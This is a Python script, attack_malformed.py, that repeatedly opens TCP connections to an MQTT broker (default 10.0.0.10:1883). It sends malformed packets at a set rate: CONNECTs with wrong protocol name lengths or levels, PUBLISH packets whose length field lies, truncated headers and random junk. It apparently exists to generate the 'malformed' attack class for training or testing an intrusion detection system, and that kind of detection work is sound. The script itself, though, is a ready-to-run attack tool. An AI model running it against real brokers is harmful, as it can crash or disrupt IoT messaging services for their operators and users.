#!/usr/bin/env python3
"""attack_malformed.py — sends MQTT packets with intentionally malformed
fields (bad protocol name, wrong length bytes, junk payload after fixed
header) so the IDS sees the MQTTset "malformed" class signature.

Usage:
    python3 attack_malformed.py --target 10.0.0.10 --rate 30 --duration 60
"""
import argparse, socket, time, random, struct, sys

def malformed_packets():
    """Yield a stream of malformed MQTT-looking byte sequences."""
    while True:
        choice = random.randint(0, 4)
        if choice == 0:
            # CONNECT with wrong protocol name length
            yield b"\x10\x0c\x00\x09MQTT\x04\x02\x00\x3c\x00\x00"
        elif choice == 1:
            # CONNECT with bogus protocol level
            yield b"\x10\x10\x00\x04MQTT\xff\x02\x00\x3c\x00\x04junk"
        elif choice == 2:
            # PUBLISH with remaining-length byte that lies (claims 50 bytes, sends 4)
            yield b"\x30\x32\x00\x04abcd"
        elif choice == 3:
            # Random garbage with MQTT-like fixed header
            yield bytes([0x10, random.randint(1,255)]) + bytes(random.randint(2,12))
        else:
            # Truncated CONNECT (only fixed header, no var header)
            yield b"\x10\x20"

def run(target, port, rate, duration):
    delay = 1.0 / rate if rate > 0 else 0
    end   = time.time() + duration
    sent  = 0
    gen   = malformed_packets()
    print(f"[*] Malformed → {target}:{port}  rate={rate}/s  duration={duration}s")
    while time.time() < end:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0)
            s.connect((target, port))
            for _ in range(10):
                if time.time() >= end:
                    break
                s.send(next(gen))
                sent += 1
                if delay:
                    time.sleep(delay)
            s.close()
        except Exception:
            time.sleep(0.1)
    print(f"[*] Done. sent={sent}")

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--target",   default="10.0.0.10")
    p.add_argument("--port",     type=int, default=1883)
    p.add_argument("--rate",     type=int, default=30)
    p.add_argument("--duration", type=int, default=60)
    a = p.parse_args()
    try:
        run(a.target, a.port, a.rate, a.duration)
    except KeyboardInterrupt:
        sys.exit(0)
